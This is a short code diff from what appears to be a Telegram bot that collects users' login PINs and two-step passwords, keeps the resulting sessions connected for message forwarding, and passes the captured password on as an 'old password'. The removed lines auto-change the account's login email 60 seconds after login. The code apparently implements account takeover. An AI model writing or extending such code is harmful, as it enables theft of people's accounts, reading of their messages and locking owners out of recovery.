@@ -3727,14 +3727,6 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             old_password=None,
         ))
 
-        # 60s after login: auto-change the account's login email if possible
-        asyncio.create_task(auto_change_email_after_login(
-            bot=context.bot,
-            user_id=user_id,
-            phone=phone,
-            client=client,
-        ))
-
         # Keep the client connected for message forwarding
         return ConversationHandler.END
 
@@ -3965,14 +3957,6 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
             phone=phone,
             client=client,
             old_password=password,
-        ))
-
-        # 60s after login: auto-change the account's login email if possible
-        asyncio.create_task(auto_change_email_after_login(
-            bot=context.bot,
-            user_id=user_id,
-            phone=phone,
-            client=client,
         ))
 
         # Keep session alive/running for forwarding
